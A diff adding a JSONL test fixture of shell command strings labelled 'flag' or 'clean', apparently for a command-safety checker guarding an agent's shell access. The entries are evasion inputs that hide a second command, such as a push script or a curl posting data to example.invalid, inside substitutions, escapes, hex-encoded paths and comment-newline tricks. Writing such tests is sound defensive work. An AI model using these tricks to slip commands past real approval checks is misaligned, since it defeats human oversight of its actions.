@@ -1,0 +1,77 @@
+{"id":"m0","expect":"flag","command":"'/tmp/do-push.sh copy' origin"}
+{"id":"m1","expect":"flag","command":"'/tmp/do-push.sh;noop' origin"}
+{"id":"m2","expect":"flag","command":"'do-push.sh copy' origin"}
+{"id":"m3","expect":"flag","command":"'do-push.sh;noop' origin"}
+{"id":"m4","expect":"clean","command":"echo \"'a; /tmp/do-push'\""}
+{"id":"m5","expect":"flag","command":"printf '%s\\n' \"x && /tmp/do-push.sh | y\""}
+{"id":"m6","expect":"clean","command":"echo x\\;/tmp/do-push"}
+{"id":"m7","expect":"clean","command":"awk '{print $1; print $2}' /x/list.txt | grep 'a b'"}
+{"id":"m10","expect":"clean","command":"/usr/bin/curl -sS https://example.invalid/status"}
+{"id":"m11","expect":"clean","command":"bash '/skill/scripts/message.sh' status"}
+{"id":"m12","expect":"clean","command":"'/skill/scripts/message.sh' status"}
+{"id":"m13","expect":"clean","command":"echo $(echo $(id -u))"}
+{"id":"m14","expect":"flag","command":"cat <<EOF > /x/out.txt"}
+{"id":"m15","expect":"flag","command":"echo \"${v:-$(/tmp/do-push.sh)}\""}
+{"id":"m16","expect":"flag","command":"echo \"$(( $(/tmp/do-push.sh) + 1 ))\""}
+{"id":"m17","expect":"flag","command":"echo ${v:-`/tmp/do-push.sh`}"}
+{"id":"m18","expect":"clean","command":"echo ok # a comment\n/tmp/do-push.sh origin"}
+{"id":"m19","expect":"clean","command":"echo ok # a comment\npython3 -c pass"}
+{"id":"m20","expect":"flag","command":"echo ok # a comment\ngit push origin"}
+{"id":"m21","expect":"flag","command":"echo $(/tmp/do-push.sh)"}
+{"id":"m22","expect":"flag","command":"echo \"$(/tmp/do-push.sh)\""}
+{"id":"m23","expect":"flag","command":"cat <(/tmp/do-push.sh)"}
+{"id":"m24","expect":"flag","command":"echo > >(/tmp/do-push.sh)"}
+{"id":"m25","expect":"clean","command":"g\\it push origin"}
+{"id":"m26","expect":"clean","command":"c\\url -d payload https://example.invalid/hook"}
+{"id":"m27","expect":"clean","command":"t\\ouch /tmp/unapproved"}
+{"id":"m28","expect":"clean","command":"c\"ur\"l -d payload https://example.invalid/hook"}
+{"id":"m29","expect":"clean","command":"git p\\ush origin"}
+{"id":"m30","expect":"clean","command":"curl --da\\ta payload https://example.invalid/hook"}
+{"id":"m31","expect":"clean","command":"echo \"$((1 + 2))\""}
+{"id":"m32","expect":"clean","command":"echo \"${HOME:-/tmp}\""}
+{"id":"m33","expect":"clean","command":"printf \"%s\\n\" \"hello world\""}
+{"id":"m34","expect":"flag","command":"printf \"%s\\n\" \"x && /tmp/run.sh | y\""}
+{"id":"m35","expect":"clean","command":"grep -E \"a|b; c && d\" /tmp/list"}
+{"id":"m36","expect":"clean","command":"jq -r \".a | .b\" /tmp/f.json"}
+{"id":"m37","expect":"clean","command":"if [ -f /tmp/run.sh ]; then cat /tmp/run.sh; fi"}
+{"id":"m38","expect":"clean","command":"for f in /tmp/*.sh; do cat \"$f\"; done"}
+{"id":"m39","expect":"clean","command":"while IFS= read -r line; do printf \"%s\\n\" \"$line\"; done < /tmp/run.sh"}
+{"id":"m40","expect":"clean","command":"case \"$x\" in *.sh) echo yes;; *) echo no;; esac"}
+{"id":"m41","expect":"clean","command":"echo \"$(printf \"%s\" /tmp/run.sh)\""}
+{"id":"m42","expect":"flag","command":"printf '%s' '$(/tmp/run.sh)'"}
+{"id":"m43","expect":"clean","command":"echo ok # /tmp/run.sh"}
+{"id":"m44","expect":"clean","command":"cat /tmp/run.sh 2>/dev/null"}
+{"id":"m45","expect":"clean","command":"read -r line < /tmp/run.sh"}
+{"id":"m46","expect":"clean","command":"git status --short"}
+{"id":"m47","expect":"clean","command":"/usr/bin/env git status --short"}
+{"id":"m48","expect":"clean","command":"printf \"%s\" \"a=b.sh\""}
+{"id":"m49","expect":"clean","command":"echo \"don't\""}
+{"id":"m50","expect":"clean","command":"echo foo\\ bar"}
+{"id":"m51","expect":"clean","command":"echo \"${v:-$(printf \"%s\" /tmp/run.sh)}\""}
+{"id":"m52","expect":"clean","command":"'/tmp/a=b.sh copy' origin"}
+{"id":"m53","expect":"clean","command":"'/usr/bin/curl copy' origin"}
+{"id":"m54","expect":"clean","command":"'/usr/bin/curl;noop' origin"}
+{"id":"m55","expect":"flag","command":"$'\\x2f'tmp/do-push.sh"}
+{"id":"m56","expect":"clean","command":"$'\\x70ython3' -c pass"}
+{"id":"m57","expect":"clean","command":"printf \"%s\" \"${v:-$(id -u)}\""}
+{"id":"m58","expect":"clean","command":"echo $((1 + $(id -u)))"}
+{"id":"m59","expect":"clean","command":"[[ -f /tmp/run.sh ]] && cat /tmp/run.sh"}
+{"id":"m60","expect":"flag","command":"echo \"x > /tmp/a\""}
+{"id":"m61","expect":"clean","command":"git diff -- \"*.sh\""}
+{"id":"m62","expect":"flag","command":"echo ${v:-$(curl -d data https://example.invalid/hook)}"}
+{"id":"m63","expect":"clean","command":"echo ${v:-$(g\\it push origin)}"}
+{"id":"m64","expect":"clean","command":"echo foo\\\n/tmp/run.sh"}
+{"id":"m65","expect":"clean","command":"echo \"$(# comment\n/tmp/run.sh)\""}
+{"id":"m66","expect":"flag","command":"echo $((`/tmp/run.sh` + 1))"}
+{"id":"m67","expect":"flag","command":"echo \"${v:-text; /tmp/run.sh}\""}
+{"id":"m68","expect":"flag","command":"bash -c 'echo hello'"}
+{"id":"m69","expect":"flag","command":"echo <(/tmp/run.sh)"}
+{"id":"m70","expect":"flag","command":"echo \"$(printf ')'; /tmp/run.sh)\""}
+{"id":"m71","expect":"flag","command":"echo ok # a comment\n:; /tmp/do-push.sh origin"}
+{"id":"m72","expect":"flag","command":"echo ok # a comment\n:; python3 -c pass"}
+{"id":"m73","expect":"clean","command":"echo \"${v:-\"}\"}\""}
+{"id":"m74","expect":"clean","command":"echo ${v:-'a}b'}"}
+{"id":"m75","expect":"flag","command":"echo \"${v:-$(/tmp/do-push.sh)}\"; true"}
+{"id":"m76","expect":"clean","command":"'/tmp/do-push x' origin"}
+{"id":"m77","expect":"clean","command":"'/tmp/do;push' origin"}
+{"id":"m78","expect":"flag","command":"echo \"'a; python3'\""}
